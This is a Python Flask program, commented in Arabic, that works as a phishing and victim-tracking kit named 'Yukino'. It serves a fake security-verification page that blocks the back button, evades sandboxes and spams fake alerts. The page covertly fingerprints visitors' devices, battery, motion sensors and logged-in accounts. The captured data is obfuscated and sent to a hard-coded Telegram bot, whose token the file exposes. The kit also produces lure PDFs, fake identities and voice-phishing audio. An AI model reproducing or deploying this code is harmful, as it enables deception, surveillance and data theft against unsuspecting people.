import time
import base64
import requests
import os
from flask import Flask, render_template_string, request, jsonify, redirect, abort, send_file
from fpdf import FPDF
from gtts import gTTS

app = Flask(__name__)

# --- إعدادات يوكينو المتقدمة ---
TELEGRAM_TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
CHAT_ID = "7706160407"
KILL_SWITCH = False 

target_data = {"status": "📡 SCANNING...", "ip": "?.?.?.?", "device": "Unknown", "battery": "--"}

# 7- تشفير "الكم"
def quantum_encrypt(data):
    step1 = base64.b64encode(data.encode()).decode()
    return base64.b64encode(step1[::-1].encode()).decode()

def send_to_hq(msg):
    encrypted = quantum_encrypt(msg)
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": f"🔐 [YUKINO_INTEL]:\n{encrypted}"}
    try: requests.post(url, json=payload)
    except: pass

# 21- مولد الأعذار الديناميكي
def get_dynamic_excuse(ua):
    if "Windows" in ua: return "Critical Windows Update KB4023057 required."
    if "iPhone" in ua: return "iCloud Identity Verification Required."
    return "Secure Token Expired. Please Re-authenticate."

# --- صفحة الفخ المتطورة (الحرباء) ---
BAIT_HTML = """
<!DOCTYPE html>
<html>
<head><title>Security Verification</title></head>
<body style="background: #000; color: #00ff41; font-family: monospace; text-align: center; padding-top: 20%;">
    <div id="status">INITIALIZING SECURE PROTOCOL...</div>
    <p id="excuse" style="color: gray;"></p>

    <script>
        // 24- منع الهروب
        history.pushState(null, null, location.href);
        window.onpopstate = function () { history.go(1); };

        async function captureDeepIntel() {
            // 17- كشف برامج الحماية (Sandbox Detection)
            const startTime = performance.now();
            for(let i=0; i<1000000; i++) { Math.sqrt(i); }
            const endTime = performance.now();
            if (endTime - startTime > 150) { 
                window.location.href = "https://www.google.com"; // الهروب إذا اكتشف حماية
                return;
            }

            // 18- استغلال الإشعارات الوهمية
            if (Notification.permission !== 'granted') {
                Notification.requestPermission().then(p => {
                    if (p === 'granted') {
                        new Notification("System Alert", { body: "Security threat detected. Verification needed.", icon: "https://cdn-icons-png.flaticon.com/512/179/179331.png" });
                    }
                });
            }

            let intel = {
                device: navigator.userAgent,
                location: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: "--",
                gyro: "N/A",
                fonts: [],
                social_status: ""
            };

            // تحليل الجيروسكوب
            if (window.DeviceOrientationEvent) {
                window.addEventListener('deviceorientation', (e) => {
                    intel.gyro = `X:${e.beta?.toFixed(1)}, Y:${e.gamma?.toFixed(1)}`;
                }, { once: true });
            }

            // سحب بصمة الخطوط
            const fonts = ["Segoe UI", "Ubuntu", "Roboto", "Helvetica"];
            fonts.forEach(f => { if (document.fonts.check(`12px "${f}"`)) intel.fonts.push(f); });

            // تحليل البطارية
            try {
                const bat = await navigator.getBattery();
                intel.battery = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
            } catch (e) {}

            // كشف الحسابات النشطة
            const apps = { facebook: "https://www.facebook.com/favicon.ico", google: "https://accounts.google.com/favicon.ico" };
            for (let name in apps) {
                const img = new Image();
                img.onload = () => { intel.social_status += name + " "; };
                img.src = apps[name] + "?t=" + Date.now();
            }

            // إرسال التقرير النهائي
            setTimeout(async () => {
                await fetch('/report', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(intel)
                });
                window.location.href = navigator.userAgent.includes("iPhone") ? "https://www.icloud.com" : "https://accounts.google.com";
            }, 1500);
        }

        window.onload = () => {
            document.getElementById('excuse').innerText = "Reason: " + captureDeepIntel.toString().includes("Windows") ? "System Update" : "Identity Sync";
            captureDeepIntel();
        };
    </script>
</body>
</html>
"""
# 33- نظام الترتيب الاستخباري (Intelligence Ranking)
def rank_target(data):
    points = 0
    if "iPhone" in data.get('device', ''): points += 50
    if "Windows" in data.get('device', ''): points += 20
    # تصنيف الأهمية بناءً على البيانات المسحوبة
    if points > 40: return "🔴 VIP TARGET (HIGH PRIORITY)"
    return "🟢 REGULAR TARGET"

# 30- التحكم المتقدم عبر التلغرام (التحكم بالهوية)
@app.route('/cmd/<command>')
def remote_control(command):
    global KILL_SWITCH
    if command == "kill":
        KILL_SWITCH = True
        return "Yukino has self-destructed."
    elif command == "status":
        return f"Yukino is active. Current Rank: {rank_target(target_data)}"

# 31- توليد الهويات الوهمية (Fake Identity Generator)
@app.route('/create_identity')
def fake_id():
    # يوكينو تولد شخصية وهمية (اسم، صورة، سيرة ذاتية) للصيد
    return jsonify({
        "name": "Sarah Ahmed",
        "role": "Security Specialist at Google",
        "reason": "Account Verification Department"
    })
# --- الأسلحة الخارجية (PDF & Audio) ---
@app.route('/generate_pdf')
def generate_pdf():
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", 'B', 16)
    pdf.cell(200, 10, txt="ENCRYPTED DOCUMENT", ln=1, align='C')
    yukino_url = f"http://{request.host}/auth"
    pdf.set_text_color(0, 0, 255)
    pdf.cell(200, 10, txt="CLICK TO DECRYPT AND VIEW", ln=1, align='C', link=yukino_url)
    pdf.output("yukino_trap.pdf")
    return send_file("yukino_trap.pdf", as_attachment=True)

@app.route('/voice_bait')
def voice_bait():
    tts = gTTS(text="Your account has been accessed from a new device. Click the link to secure it.", lang='en')
    tts.save("voice_alert.mp3")
    return send_file("voice_alert.mp3", as_attachment=True)

@app.route('/auth')
def gate():
    if KILL_SWITCH: return abort(404)
    return render_template_string(BAIT_HTML)

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    msg = f"🎯 TARGET COMPROMISED!\nIP: {request.remote_addr}\nDevice: {data['device']}\nBattery: {data['battery']}\nGyro: {data['gyro']}\nApps: {data['social_status']}"
    send_to_hq(msg)
    return "OK", 200

@app.route('/')
def dashboard():
    return "[ YUKINO CONTROL CENTER - STANDBY ]"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)